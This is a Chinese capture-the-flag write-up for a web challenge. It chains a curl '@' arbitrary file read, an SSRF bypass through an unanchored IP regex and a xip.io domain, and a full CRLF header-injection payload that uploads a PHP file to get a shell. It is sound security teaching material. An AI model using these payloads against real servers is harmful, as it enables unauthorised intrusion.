### web400-5 writeup 

#### 0x1 获取源代码

发现程序实现基本的发HTTP请求，和接收HTTP请求的功能。

看到发POST请求的时候，看到用的请求头是的`Content-Type`是`multipart/form-data`
```
POST /web2/adminApi/index.php HTTP/1.1
Host: 127.0.0.1
Accept: */*
Content-Length: 150
Content-Type: multipart/form-data; boundary=------------------------ceee82fe79c2c00b
```
所以想后台应该用的是
```php
curl_setopt($ch, CURLOPT_POSTFIELDS, array("username"=>"admin"));    
```
所以想到可以用`@`符进行任意文件读取,post数据为:
```
file=@repeater.php
``` 
进行任意文件读取，发现还有后台 `adminApi/index.php`,依次读取所有文件，
发现后台是`pwnhub`的公开赛的任意文件上传的那个题，但是限制了请求来源的ip必须是本地地址，

**所以思路就是通过前面的PHP程序向后台发送数据，来getshell**

#### 0x2 绕过SSRF过滤

看repeater.php中限制了SSRF。

```php
function isInternalIp($ip) {
    $ip = ip2long($ip);
    $net_a = ip2long('10.255.255.255') >> 24; //A类网预留ip的网络地址
    $net_b = ip2long('172.31.255.255') >> 20; //B类网预留ip的网络地址
    $net_c = ip2long('192.168.255.255') >> 16; //C类网预留ip的网络地址
    $net_l = ip2long('127.255.255.255') >> 24;
    return $ip >> 24 === $net_a || $ip >> 20 === $net_b || $ip >> 16 === $net_c || $ip >> 24 === $net_l;
}
```
这段代码是@phithon的限制SSRF漏洞的代码，不存在问题。
但是看到这里：
```php
if(preg_match('/^([2][0-4]\d|[2][5][0-5]|[1]\d\d|[1-9][\d]|[\d])(\.([2][0-4]\d|[2][5][0-5]|[1]\d\d|[1-9][\d]|[\d])){3}/',$urlInfo["host"])){
    $ip = $urlInfo["host"];
}else{
    $ip = gethostbyname($urlInfo["host"]);    
}
```
看到正则的后面没有用`$`结尾，造成绕过,用这样的域名就可以伪造IP:
```
10.10.10.10.com
```
只需要找到一个这样的域名，解析到`127.0.0.1`就可以绕过SSRF的过滤了。

网上有个服务`http://xip.io` ，这是一个“神奇”的域名，它会自动将包含某个IP地址的子域名解析到该IP。比如 127.0.0.1.xip.io ，将会自动解析到127.0.0.1，www.10.0.0.1.xip.io将会解析到10.0.0.1：

```bash
web400-5 git:(master) dig 127.0.0.1.xip.io

; <<>> DiG 9.8.3-P1 <<>> 127.0.0.1.xip.io
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39428
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;127.0.0.1.xip.io.		IN	A

;; ANSWER SECTION:
127.0.0.1.xip.io.	300	IN	A	127.0.0.1

;; Query time: 5 msec
;; SERVER: 192.168.191.1#53(192.168.191.1)
;; WHEN: Mon Oct 23 20:39:19 2017
;; MSG SIZE  rcvd: 66

```
所以可以用域名`127.0.0.1.xip.io`来绕过。

#### 0x3 getshell

但是没法控制上传的文件内容，怎么上传一个shell呢？

发现我们可以控制请求的header，想到CRLF漏洞，我们在header中利用CRLF漏洞
注入一个完整的上传文件的请求的body体，就可以上传文件。

一个可用的payload如下：
```
Content-Length: 750
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylxknDywuiKIurEpO%0d%0a%0d%0a------WebKitFormBoundarylxknDywuiKIurEpO%0d%0aContent-Disposition: form-data; name="upfile[1]"%0d%0a%0d%0atest%0d%0a------WebKitFormBoundarylxknDywuiKIurEpO%0d%0aContent-Disposition: form-data; name="upfile[2]"%0d%0a%0d%0apng%0d%0a------WebKitFormBoundarylxknDywuiKIurEpO%0d%0aContent-Disposition: form-data; name="upfile[4]"%0d%0a%0d%0aphp%0d%0a------WebKitFormBoundarylxknDywuiKIurEpO%0d%0aContent-Disposition: form-data; name="upfile"; filename="2.php"%0d%0aContent-Type: text/php%0d%0a%0d%0a<?php phpinfo();?>%0d%0a------WebKitFormBoundarylxknDywuiKIurEpO--%0d%0a
```
就可以成功getshell。



 